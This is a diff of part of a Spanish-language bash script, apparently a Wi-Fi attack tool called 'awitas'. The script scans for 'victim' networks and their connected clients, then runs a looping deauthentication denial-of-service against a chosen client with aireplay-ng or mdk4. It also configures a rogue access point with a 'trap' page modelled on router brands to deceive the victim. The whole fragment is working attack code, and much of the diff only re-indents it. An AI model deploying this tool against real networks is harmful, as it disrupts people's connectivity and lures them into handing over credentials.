-    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $respuesta${NORMAL} no es una opción valida. Pulsa ENTER para probar otra vez${NORMAL}"
-    read
-    parseo
-    exit
-fi
+}
+
+function dos() {
+    clear
+    banner
+    rm ${pwd}parar &>/dev/null
+    echo;echo -e "${AMARILLO}   COMIENZA EL ATAQUE! No se abrirán ventanas adicionales. Para depurar, mirar en la carpeta ${pwd}${BLANCO}";echo
+    echo -e "${VERDE}[AP]${BLANCO}	Punto de acceso ${AMARILLO}$nombre_ap${BLANCO} levantado! Seguimos...${BLANCO}"
+    echo -e "${VERDE}[DoS]${BLANCO}	Inicia ataque DoS..."
+    while :
+    do
+        ls ${pwd}parar &>/dev/null
+        if [ $? = 0 ];then
+            break
+        fi
+        timeout=10
+        canal_nuevo
+        canal=$canal_nuevo
+        echo -e "${AMARILLO}[DoS]${BLANCO}	El cliente esta en el canal${CYAN} ${canal}${BLANCO}. Seguimos el ataque..."
+        echo -e "${AMARILLO}[DoS]${BLANCO}	Reiniciando DoS..."
+        ip a | grep $iface_dos &>/dev/null
+        if [ $? = 0 ];then
+            iw dev $iface_dos set channel $canal &>/dev/null
+            else
+                monitor poner  &>/dev/null
+        fi
+        if [ "$mdk4" = "si" ];then
+            timeout --preserve-status --foreground $tiempo_mdk4 mdk4 $iface_mon d -c $canal -B $macap -S $mac_estacion &>>${pwd}mdk4
+        else
+            aireplay-ng -0 $desaut -a $macap -c $mac_estacion $iface_mon --ignore-negative-one &>>${pwd}aireplay
+        fi
+        pid_aireplay=$!
+    done
+    echo -e "${AMARILLO}[DoS]${BLANCO}	Ataque DoS parado por completo."
+}
+
+function canal_nuevo {
+    rm ${pwd}airodump_canal* 2>/dev/null
+    if [ $banda5 = si ];then
+        timeout --preserve-status --foreground $timeout airodump-ng --band a --bssid $macap $iface_mon -w ${pwd}airodump_canal --output-format csv 2>${pwd}fallo_airodump5&>/dev/null
+    else
+        timeout --preserve-status --foreground $timeout airodump-ng --bssid $macap $iface_mon -w ${pwd}airodump_canal --output-format csv 2>${pwd}fallo_airodum24&>/dev/null
+    fi
+    canal_nuevo=`cat ${pwd}airodump_canal-01.csv | grep $macap | grep WPA | awk -F "," '{print $4}'` &>/dev/null
+    if [ $banda5 = si ];then
+        if (( canal_nuevo >=36 && canal_nuevo <= 165 ));then
+            echo "$canal_nuevo" >${pwd}canal_nuevo &>/dev/null
+        else
+            echo -e "${ROJO}[DoS]${BLANCO}	No es posible determinar el canal de la red victima. Repetimos..."
+            timeout=$((timeout+2))
+            canal_nuevo
+        fi
+    else
+        if (( canal_nuevo >=1 && canal_nuevo <= 14 ));then
+            echo "$canal_nuevo" >${pwd}canal_nuevo &>/dev/null
+        else
+            echo -e "${ROJO}[DoS]${BLANCO}	No es posible determinar el canal de la red victima. Repetimos..."
+            timeout=$((timeout+2))
+            canal_nuevo
+        fi
+    fi
+    canal=$canal_nuevo
+    echo $canal ${pwd}canal &>/dev/null
+}
+
+function config_ap() {
+    clear
+    banner
+    echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora toca configurar nuestro punto de acceso${BLANCO}."
+    echo -e "${AMARILLO}[::]${BLANCO} Levantaremos un punto de acceso protegido (solo para clientes con windows) o abierto? ${BLANCO}";echo
+    echo -e "  ${AMARILLO}1)${BLANCO}  Protegido"
+    echo -e "  ${AMARILLO}2)${BLANCO}  Abierto"
+    echo;echo -ne "${AMARILLO}[??]${BLANCO} Opción: "
+    read tipo
+    if [ -z $tipo ];then
+            echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
+            read
+            config_ap
+    fi
+    validar_numero $tipo config_ap
+    if [ $tipo -ne 1 ] && [ $tipo -ne 2 ];then
+        echo -ne "${ROJO}[!!]${BLANCO} $tipo no es una respuesta valida. Pulsa ENTER para intentarlo otra vez"
+        read
+        config_ap
+    fi
+    echo;echo -ne "${AMARILLO}[::]${BLANCO} Nombre el punto de acceso que vamos a crear. (Necesario): "
+    read nombre_ap
+    if [ -z $nombre_ap ];then
+            echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
+            read
+            config_ap 
+    fi
+    echo $nombre_ap >${pwd}nombre_ap &>/dev/null
+    if [ -z "$marca" ];then
+        marca=desconocido
+    fi
+    clear
+    banner
+    echo;echo -e "${AMARILLO}[::]${BLANCO} Info recopilada de la victima:"
+    echo;echo -e "${AZUL} Info OUI (marca): ${BLANCO}$marca"
+    echo -e "${AZUL} BSSID:${BLANCO} $maoui"
+    echo -e "${AZUL} ESSID:${BLANCO}$red"
+    echo;echo -e "${AMARILLO}[::]${BLANCO} Elige la mejor opción para la trampa. Si no sabes qué es esto, elige genérico: "
+    echo
+    rm ${pwd}modelos 2>/dev/null
+    touch ${pwd}modelos
+    cuenta=1
+    for i in `ls imagenes`;do
+        echo -e "  ${AMARILLO}${cuenta})${BLANCO}  $i"
+        echo " $cuenta $i" >>${pwd}modelos
+        essids=`cat imagenes/${i}/targets | awk -F ';' '{print $3}'`
+        bssids=`cat imagenes/${i}/targets | awk -F ';' '{print $2}'`
+        mamo=`cat imagenes/${i}/targets | awk -F ';' '{print $1}'`
+        echo -e "       ${VIOLETA} Targets: ${AZUL}Marca y modelo: ${BLANCO}$mamo ${AZUL} BSSIDS:${BLANCO} $bssids${AZUL} ESSIDS:${BLANCO} $essids"
+        echo 
+        cuenta=$((cuenta+1))
+        done
+    echo;echo -ne "${AMARILLO}[??]${BLANCO} Opcion: "
+    read puesto
+    if [ -n "$puesto" ];then
+        validar_numero $puesto config_ap
+    else
+        echo -ne "${ROJO}[!!]${BLANCO} $puesto no es una opción valida. Pulsa ENTER para intentarlo otra vez"        
+            read
+            config_ap
+    fi
+    grep -q $puesto ${pwd}modelos
+    if [ $? -ne 0 ];then
+    echo -ne "${ROJO}[!!]${BLANCO} $puesto no es una opción valida. Pulsa ENTER para intentarlo otra vez"        
+            read
+            config_ap
+    fi
+    modelo=`cat ${pwd}modelos | grep $puesto | awk '{print $2}'`
+    comprobar
+}
+
+function clientes() {
+    clear
+    banner
+    sed -n ${1}p ${pwd}airodump >${pwd}elegida
+    macap=`cat ${pwd}elegida | cut -d ',' -f1`
+    maoui=`echo $macap | awk -F ":" '{print $1 $2 $3}'`
+    echo $cana1 >${pwd}canal &>/dev/null
+    rm ${pwd}macap 2>/dev/null
+    rm ${pwd}cliente* 2>/dev/null
+    echo "$macap" >${pwd}macap
+    marca=`grep $maoui oui.txt 2>/dev/null | cut -f3,4,5,6,7,8`
+    if [ -z $marca ];then
+        marca=desconocido
+    fi
+    red=`cat ${pwd}elegida | cut -d ',' -f14`
+    echo;echo -e "${AMARILLO} TU ELECCION:"
+    echo;echo -e "${AMARILLO} Punto de acceso ${BLANCO}$red  ${AMARILLO}MAC ${BLANCO}$MAC $macap	${AMARILLO}Info OUI (marca)${BLANCO} $marca"
+    echo;echo -e "${AMARILLO} CLIENTES CONECTADOS:${BLANCO}";echo
+    cuenta=1
+    for i in `grep $macap ${pwd}airodump | grep -v WPA | cut -d ',' -f1`
+    do
+        echo $i >${pwd}cliente${cuenta}
+        maoui_cliente=`echo $i | awk -F ":" '{print $1 $2 $3}'`
+        marca_cliente=$`grep $maoui_cliente oui.txt 2>/dev/null | cut -f3,4,5,6,7,8`
+        echo -e "	${CYAN}MAC ${BLANCO} $i ${CYAN}Info OUI (marca) ${BLANCO} $marca_cliente"
+        cuenta=$((cuenta+1))
+    done
+    echo;echo -e "${AMARILLO}[::]${BLANCO} Elige una de las siguientes opciones:" ;echo
+    echo -e "		${AMARILLO}1)${BLANCO} Quiero elegir un cliente y continuar el ataque."
+    echo -e "		${AMARILLO}2)${BLANCO} Quiero elegir otra red de las que hemos escaneado ya."
+    echo -e "		${AMARILLO}3)${BLANCO} Quiero volver a escanear."
+    echo;echo -ne "${AMARILLO}[::]${BLANCO} Opción: "
+    read respuesta
+    if [ -z $respuesta ];then
+            echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para intentarlo de nuevo, y pon mas atención: "
+            read
+            parseo
+    fi
+    validar_numero $respuesta parseo
+    if [ $respuesta = 1 ];then
+        clear
+        banner
+        echo;echo -e "${AMARILLO}[::]${BLANCO} Ok!. Escoge un numero de cliente ";echo
+        cuenta=1
+        for i in `grep $macap ${pwd}airodump | grep -v WPA | cut -d ',' -f1`
+        do
+            maoui_cliente=`echo $i | awk -F ":" '{print $1 $2 $3}'`
+            marca_cliente=`grep $maoui_cliente oui.txt 2>/dev/null | cut -f3,4,5,6,7,8`
+            echo -e "${AMARILLO} ${cuenta}) ${CYAN}MAC ${BLANCO} $i ${CYAN}Info OUI (marca) ${BLANCO} $marca_cliente"
+            cuenta=$((cuenta+1))
+        done
+        echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
+        read opcion
+        if [ -z $opcion ];then
+            echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
+            read
+            parseo
+        fi
+        validar_numero $opcion parseo
+        cuenta=$((cuenta-1))
+        if [ $opcion -le $cuenta ]; then
+            mac_estacion=`cat ${pwd}cliente${opcion}`
+            elegir_dos
+        else
+            echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
+            read
+            parseo
+        fi
+    elif [ $respuesta = 2 ];then
+        parseo
+    elif [ $respuesta = 3 ];then
+        airodump
+    else
+        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $respuesta${NORMAL} no es una opción valida. Pulsa ENTER para probar otra vez${NORMAL}"
+        read
+        parseo
+        exit
+    fi
 }
 
 function elegir_dos() {
-ls ${pwd}Openwrt
-if [ $? -ne 0  ];then
-    clear
-    banner
-    echo;echo -e "${AMARILLO}[::]${BLANCO} Como quieres hacer el DoS?"
-    echo;echo -e "${AMARILLO}  1)${BLANCO}  Aireplay."
-    echo -e "${AMARILLO}  2)${BLANCO}  Mdk4."
-    echo;echo -ne "${AMARILLO}[::]${BLANCO} Opción: "
-    read opcion
-    if [ -z $opcion ];then
-        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
-        read
-        elegir_dos
+    ls ${pwd}Openwrt
+    if [ $? -ne 0  ];then
+        clear
+        banner
+        echo;echo -e "${AMARILLO}[::]${BLANCO} Como quieres hacer el DoS?"
+        echo;echo -e "${AMARILLO}  1)${BLANCO}  Aireplay."
+        echo -e "${AMARILLO}  2)${BLANCO}  Mdk4."
+        echo;echo -ne "${AMARILLO}[::]${BLANCO} Opción: "
+        read opcion
+        if [ -z $opcion ];then
+            echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
+            read
+            elegir_dos
+        fi
+        validar_numero $opcion elegir_dos
+        if [ $opcion = "1" ];then
+            mdk4=no
+            ataque_dos=aireplay
+        elif [ $opcion = "2" ];then
+            mdk4=si
+            ataque_dos=Mdk4
+        else
+            echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion ${NORMAL}no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
+            read
+            elegir_dos
+        fi
     fi
-    validar_numero $opcion elegir_dos
-    if [ $opcion = "1" ];then
-        mdk4=no
-        ataque_dos=aireplay
-    elif [ $opcion = "2" ];then
-        mdk4=si
-        ataque_dos=Mdk4
-    else
-        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion ${NORMAL}no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
-        read
-        elegir_dos
-    fi
-fi
-config_ap
+    config_ap
 }
 
 function banner() {
-echo -e "${CYAN}                 _            "
-echo -e "   __ ___      _(_) |_ __ _ ___ "
-echo -e "  / _\` \\ \\ /\\ / / | __/ _\` / __|"
-echo -e " | (_| |\\ V  V /| | || (_| \\__ \\"
-echo -e "  \\__,_| \\_/\_/ |_|\\__\\__,_|___/ $version byTux0"
-echo -e "  ${VIOLETA}Ataque WPS transparente con rogue AP${BLANCO}   "
-echo -n " Sistemas conocidos: "
-for i in Wifislax Openwrt Kali Parrot Parrot_ARM RaspOS Debian Kali_ARM;do
-    ls ${pwd}${i} &>/dev/null
-    if [ $? -eq 0 ];then
-        echo -n "${VERDE} $i "
-        distro=si
-    else
-        echo -ne "${AZUL} $i "
+    echo -e "${CYAN}                 _            "
+    echo -e "   __ ___      _(_) |_ __ _ ___ "
+    echo -e "  / _\` \\ \\ /\\ / / | __/ _\` / __|"
+    echo -e " | (_| |\\ V  V /| | || (_| \\__ \\"
+    echo -e "  \\__,_| \\_/\_/ |_|\\__\\__,_|___/ $version byTux0"
+    echo -e "  ${VIOLETA}Ataque WPS transparente con rogue AP${BLANCO}   "
+    echo -n " Sistemas conocidos: "
+    for i in Wifislax Openwrt Kali Parrot Parrot_ARM RaspOS Debian Kali_ARM;do
+        ls ${pwd}${i} &>/dev/null
+        if [ $? -eq 0 ];then
+            echo -n "${VERDE} $i "
+            distro=si
+        else
+            echo -ne "${AZUL} $i "
+        fi
+    done
+    if [ "$distro" != "si" ];then
+            echo -n "${VERDE} Distro desconocida "
     fi
-done
-if [ "$distro" != "si" ];then
-        echo -n "${VERDE} Distro desconocida "
-fi
-echo
+    echo
 }
 
 function parseo() {
-clear
-banner
-cuenta=1
-sed '/^[[:space:]]*$/d' ${pwd}airodump_csv-01.csv | tail -n +2  > ${pwd}airodump
-echo;echo -e "${AMARILLO}[::]${BLANCO} Redes encontradas:";echo
-while IFS= read -r line
-do
-    echo $line | grep Station >/dev/null
-    if [ $? = 0 ];then
-        break
-    fi
-    mac=`echo $line | cut -d ',' -f1`
-    grep $mac ${pwd}airodump | grep -v WPA >/dev/null 
-    if [ $? = 0 ];then
-        clients="${VERDE}si${BLANCO}"
+    clear
+    banner
+    cuenta=1
+    sed '/^[[:space:]]*$/d' ${pwd}airodump_csv-01.csv | tail -n +2  > ${pwd}airodump
+    echo;echo -e "${AMARILLO}[::]${BLANCO} Redes encontradas:";echo
+    while IFS= read -r line
+    do
+        echo $line | grep Station >/dev/null
+        if [ $? = 0 ];then
+            break
+        fi
+        mac=`echo $line | cut -d ',' -f1`
+        grep $mac ${pwd}airodump | grep -v WPA >/dev/null 
+        if [ $? = 0 ];then
+            clients="${VERDE}si${BLANCO}"
+        else
+            clients="${ROJO}no${BLANCO}"
+        fi
+        echo " ${AMARILLO}${cuenta})	${CYAN}BSSID${BLANCO}	`echo $line |  cut -d ',' -f1`	${CYAN}Canal${BLANCO}	`echo $line |  cut -d ',' -f4`	${CYAN}clientes${BLANCO} $clients	${CYAN}Nombre Ap${BLANCO}	`echo $line | cut -d ',' -f14`"
+        cuenta=$((cuenta+1))
+    done < ${pwd}airodump
+    echo;echo -ne "${AMARILLO}[??]${BLANCO} Elige una de ellas para estudiarla o no escribas nada para volver a escanear. Opción: "
+    read red
+    if [ -v $red ];then
+        airodump
     else
-        clients="${ROJO}no${BLANCO}"
+        validar_numero $red parseo
+        cuenta=$((cuenta-1))
+        if [ $red -le $cuenta ]; then
+            clientes $red 
+        else
+            echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL}. $red${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
+            read
+            parseo
+        fi
     fi
-    echo " ${AMARILLO}${cuenta})	${CYAN}BSSID${BLANCO}	`echo $line |  cut -d ',' -f1`	${CYAN}Canal${BLANCO}	`echo $line |  cut -d ',' -f4`	${CYAN}clientes${BLANCO} $clients	${CYAN}Nombre Ap${BLANCO}	`echo $line | cut -d ',' -f14`"
-    cuenta=$((cuenta+1))
-done < ${pwd}airodump
-echo;echo -ne "${AMARILLO}[??]${BLANCO} Elige una de ellas para estudiarla o no escribas nada para volver a escanear. Opción: "
-read red
-if [ -v $red ];then
-    airodump
-else
-    validar_numero $red parseo
-    cuenta=$((cuenta-1))
-    if [ $red -le $cuenta ]; then
-        clientes $red 
-    else
-        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL}. $red${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
-        read
-        parseo
-    fi
-fi
 }
 
 function airodump() {
-clear
-banner
-echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos será escanear para buscar una víctima."
-echo -e "${AMARILLO}[::]${BLANCO} Vamos a buscar nuestra victima. Ten en cuenta que necesitamos al menos un cliente con windows para el punto de acceso protegido."
-echo -e "${AMARILLO}[::]${BLANCO} Cuando creas que ya es suficiente, cierra aierodump con ctrl+c y el script seguirá su marcha."
-echo -ne "${AMARILLO}[::]${BLANCO} Pulsa ENTER para iniciar la búsqueda"
-read
-rm ${pwd}airodump* 2>/dev/null
-airodump=1
-if [ $banda5 = si ];then
-    airodump-ng  --band a --wps --output-format csv --manufacturer $iface_mon -w ${pwd}airodump_csv #2>/dev/null
-else
-    airodump-ng  --wps --output-format csv --manufacturer $iface_mon -w ${pwd}airodump_csv 2>/dev/null
-fi
-airodump=0
-parseo
+    clear
+    banner
+    echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos será escanear para buscar una víctima."
+    echo -e "${AMARILLO}[::]${BLANCO} Vamos a buscar nuestra victima. Ten en cuenta que necesitamos al menos un cliente con windows para el punto de acceso protegido."
+    echo -e "${AMARILLO}[::]${BLANCO} Cuando creas que ya es suficiente, cierra aierodump con ctrl+c y el script seguirá su marcha."
+    echo -ne "${AMARILLO}[::]${BLANCO} Pulsa ENTER para iniciar la búsqueda"
+    read
+    rm ${pwd}airodump* 2>/dev/null
+    airodump=1
+    if [ $banda5 = si ];then
+        airodump-ng  --band a --wps --output-format csv --manufacturer $iface_mon -w ${pwd}airodump_csv #2>/dev/null
+    else
+        airodump-ng  --wps --output-format csv --manufacturer $iface_mon -w ${pwd}airodump_csv 2>/dev/null
+    fi
+    airodump=0
+    parseo
 }
 
 function scan() {
-echo -e "${AMARILLO}[::]${BLANCO} Poniendo $iface_dos en modo monitor..."
-monitor poner
-if [ $? = 0 ];then
-    echo -e "${VERDE}[::]${BLANCO} Hecho!"
-    sleep 1
-else
-    echo -e "${ROJO}[!!]${BLANCO} Algo salio mal. Saliendo..."
-fi
-airodump
+    echo -e "${AMARILLO}[::]${BLANCO} Poniendo $iface_dos en modo monitor..."
+    monitor poner
+    if [ $? = 0 ];then
+        echo -e "${VERDE}[::]${BLANCO} Hecho!"
+        sleep 1
+    else
+        echo -e "${ROJO}[!!]${BLANCO} Algo salio mal. Saliendo..."
+    fi
+    airodump
 }
 
 function monitor() {
-if [ $1 = quitar ];then
-    ip link set dev $iface_dos down
-    ip link set dev $iface_dos name $iface_dos
-    ip link set dev $iface_dos up
-    ip link set dev $iface_dos down
-    iwconfig $iface_dos mode Managed
-    ip link set dev $iface_dos up
-elif [ $1  = poner ];then
-    ip link set dev $iface_dos down
-    if [ $? -eq 0 ];then
-        iw dev $iface_dos set monitor none
+    if [ $1 = quitar ];then
+        ip link set dev $iface_dos down
+        ip link set dev $iface_dos name $iface_dos
         ip link set dev $iface_dos up
-        iface_mon=$iface_dos
-        echo $iface_mon >${pwd}iface_mon
-        echo $canal >${pwd}canal_mon &>/dev/null
-    else
-        echo " Se ha fallado al poner tu dispositivo en modo monitor. Revisa que tu dispositivo soporte esta opción."
-        exit 1
+        ip link set dev $iface_dos down
+        iwconfig $iface_dos mode Managed
+        ip link set dev $iface_dos up
+    elif [ $1  = poner ];then
+        ip link set dev $iface_dos down
+        if [ $? -eq 0 ];then
+            iw dev $iface_dos set monitor none
+            ip link set dev $iface_dos up
+            iface_mon=$iface_dos
+            echo $iface_mon >${pwd}iface_mon
+            echo $canal >${pwd}canal_mon &>/dev/null
+        else
+            echo " Se ha fallado al poner tu dispositivo en modo monitor. Revisa que tu dispositivo soporte esta opción."
+            exit 1
+        fi
+    elif [ $1 = limpiar ];then
+        echo "se ejecutar limpiar" >${pwd}limpiar
+        ip link set dev $iface_dos down
+        iwconfig $iface_dos mode Managed
+        ip link set dev $iface_dos up
     fi
-elif [ $1 = limpiar ];then
-    echo "se ejecutar limpiar" >${pwd}limpiar
-    ip link set dev $iface_dos down
-    iwconfig $iface_dos mode Managed
-    ip link set dev $iface_dos up
-fi
 }
 
 function empezar() {
@@ -1239,43 +1239,43 @@ function empezar() {
 }
 
 function elegir_monitor() {
-clear
-banner
-echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos será elegir un dispositivo para el ataque DoS."
-echo -e "${AMARILLO}[::]${BLANCO} Debes estar seguro de que el dispositivo tiene la capacidad de inyectar paquetes."
-echo -e "${AMARILLO}[::]${BLANCO} Recuerda que, si estamos haciendo el ataque en la banda de 5 GHz, necesitamos que este dispositivo trabaje en la banda de 5GHz"
-echo;echo "${ROJO} ATENCION!!${NORMAL} Que un dispositivo acepte el modo monitor no significa necesariamente que pueda hacer"
-echo " un ataque de desautenticacion. Tendrás que hacer tus propias pruebas para estar seguro.";echo
-eleccion_dispositivo
-echo -e  "${AMARILLO}[::]${BLANCO} Estos son los dispositivos que quedan disponibles:"
-echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo para hacer el ataque de desautenticacion (DoS)";echo
-cuenta=1
-for i in `cat ${pwd}lista_interfaces | grep -v $iface_ap`
-do
-    echo -e " ${AMARILLO}${cuenta})${BLANCO}  $i "
-    cuenta=$((cuenta+1))
-done
-echo;echo -ne "${AMARILLO}[::]${BLANCO} Debes estar seguro de que puede inyectar paquetes. Opción: "
-read opcion
-if [ -z $opcion ];then
-    echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
-    read
-    elegir_monitor
-fi
-validar_numero $opcion elegir_monitor 
-cuenta=$((cuenta-1))
-if [ $opcion -le $cuenta ]; then
-    cuenta=$((cuenta+1))
-    cat ${pwd}lista_interfaces | grep -v $iface_ap| sed  -n ${opcion}p | cut -f 1 >${pwd}iface_dos
-    iface_dos=`cat ${pwd}iface_dos`
-    echo -ne "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_dos${BLANCO} para crear nuestro ataque DoS. Pulsa ENTER para continuar"
-    read
-    scan
-else
-    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
-    read
-    elegir_monitor
-fi
+    clear
+    banner
+    echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos será elegir un dispositivo para el ataque DoS."
+    echo -e "${AMARILLO}[::]${BLANCO} Debes estar seguro de que el dispositivo tiene la capacidad de inyectar paquetes."
+    echo -e "${AMARILLO}[::]${BLANCO} Recuerda que, si estamos haciendo el ataque en la banda de 5 GHz, necesitamos que este dispositivo trabaje en la banda de 5GHz"
+    echo;echo "${ROJO} ATENCION!!${NORMAL} Que un dispositivo acepte el modo monitor no significa necesariamente que pueda hacer"
+    echo " un ataque de desautenticacion. Tendrás que hacer tus propias pruebas para estar seguro.";echo
+    eleccion_dispositivo
+    echo -e  "${AMARILLO}[::]${BLANCO} Estos son los dispositivos que quedan disponibles:"
+    echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo para hacer el ataque de desautenticacion (DoS)";echo
+    cuenta=1
+    for i in `cat ${pwd}lista_interfaces | grep -v $iface_ap`
+    do
+        echo -e " ${AMARILLO}${cuenta})${BLANCO}  $i "
+        cuenta=$((cuenta+1))
+    done
+    echo;echo -ne "${AMARILLO}[::]${BLANCO} Debes estar seguro de que puede inyectar paquetes. Opción: "
+    read opcion
+    if [ -z $opcion ];then
+        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
+        read
+        elegir_monitor
+    fi
+    validar_numero $opcion elegir_monitor 
+    cuenta=$((cuenta-1))
+    if [ $opcion -le $cuenta ]; then
+        cuenta=$((cuenta+1))
+        cat ${pwd}lista_interfaces | grep -v $iface_ap| sed  -n ${opcion}p | cut -f 1 >${pwd}iface_dos
+        iface_dos=`cat ${pwd}iface_dos`
+        echo -ne "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_dos${BLANCO} para crear nuestro ataque DoS. Pulsa ENTER para continuar"
+        read
+        scan
+    else
+        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
+        read
+        elegir_monitor
+    fi
 }
 
 bandera=fax
